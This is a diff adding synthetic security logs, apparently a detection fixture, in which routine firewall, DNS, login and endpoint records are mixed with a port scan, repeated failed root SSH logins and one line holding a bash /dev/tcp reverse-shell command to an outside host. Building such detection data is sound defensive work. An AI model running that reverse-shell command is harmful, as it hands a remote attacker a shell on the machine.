@@ -1,0 +1,757 @@
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.30", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "dns", "src_ip": "10.0.1.19", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:00:00+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:00:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.13", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:00:10+00:00", "log_type": "dns", "src_ip": "10.0.1.14", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:00:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:00:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.33", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:00:20+00:00", "log_type": "dns", "src_ip": "10.0.1.47", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:00:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:00:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.42", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:00:30+00:00", "log_type": "dns", "src_ip": "10.0.1.23", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:00:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:00:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.15", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:00:40+00:00", "log_type": "dns", "src_ip": "10.0.1.37", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:00:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.14", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "dns", "src_ip": "10.0.1.25", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:00:50+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:01:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.45", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:01:00+00:00", "log_type": "dns", "src_ip": "10.0.1.37", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:01:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:01:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.46", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:01:10+00:00", "log_type": "dns", "src_ip": "10.0.1.17", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:01:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:01:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.50", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:01:20+00:00", "log_type": "dns", "src_ip": "10.0.1.50", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:01:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:01:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.46", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:01:30+00:00", "log_type": "dns", "src_ip": "10.0.1.47", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:01:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.13", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "dns", "src_ip": "10.0.1.24", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:01:40+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 20, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:41+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 21, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:42+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 22, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:43+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 23, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:44+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 24, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:45+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 25, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:46+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 26, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:47+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 27, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:48+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 28, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:49+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 29, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.45", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:01:50+00:00", "log_type": "dns", "src_ip": "10.0.1.18", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:01:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:01:50+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 30, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:51+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 31, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:52+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 32, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:53+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 33, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:54+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 34, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:55+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 35, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:56+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 36, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:57+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 37, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:58+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 38, "action": "deny"}
+{"timestamp": "2026-10-04T09:01:59+00:00", "log_type": "firewall", "src_ip": "203.0.113.50", "dst_ip": "10.0.0.5", "dst_port": 39, "action": "deny"}
+{"timestamp": "2026-10-04T09:02:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.36", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:02:00+00:00", "log_type": "dns", "src_ip": "10.0.1.19", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:02:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:02:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.46", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:02:10+00:00", "log_type": "dns", "src_ip": "10.0.1.29", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:02:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:02:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.16", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:02:20+00:00", "log_type": "dns", "src_ip": "10.0.1.47", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:02:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.33", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "dns", "src_ip": "10.0.1.16", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:02:30+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:02:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.46", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:02:40+00:00", "log_type": "dns", "src_ip": "10.0.1.13", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:02:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:02:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.41", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:02:50+00:00", "log_type": "dns", "src_ip": "10.0.1.44", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:02:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:03:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.30", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:03:00+00:00", "log_type": "dns", "src_ip": "10.0.1.39", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:03:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:03:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.33", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:03:10+00:00", "log_type": "dns", "src_ip": "10.0.1.29", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:03:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.21", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "dns", "src_ip": "10.0.1.25", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:03:20+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:23+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:26+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:29+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.46", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:03:30+00:00", "log_type": "dns", "src_ip": "10.0.1.29", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:03:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:03:32+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:35+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:38+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.31", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:03:40+00:00", "log_type": "dns", "src_ip": "10.0.1.38", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:03:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:03:41+00:00", "log_type": "linux", "host": "web01", "src_ip": "198.51.100.9", "user": "root", "message": "Failed password for root from 198.51.100.9"}
+{"timestamp": "2026-10-04T09:03:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.48", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:03:50+00:00", "log_type": "dns", "src_ip": "10.0.1.14", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:03:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:04:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.42", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:04:00+00:00", "log_type": "dns", "src_ip": "10.0.1.36", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:04:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.31", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "dns", "src_ip": "10.0.1.19", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:04:10+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:04:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.36", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:04:20+00:00", "log_type": "dns", "src_ip": "10.0.1.12", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:04:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:04:20+00:00", "log_type": "linux", "host": "web01", "user": "bob", "message": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"}
+{"timestamp": "2026-10-04T09:04:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.45", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:04:30+00:00", "log_type": "dns", "src_ip": "10.0.1.46", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:04:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:04:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.31", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:04:40+00:00", "log_type": "dns", "src_ip": "10.0.1.32", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:04:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:04:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.47", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:04:50+00:00", "log_type": "dns", "src_ip": "10.0.1.39", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:04:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.15", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "dns", "src_ip": "10.0.1.27", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
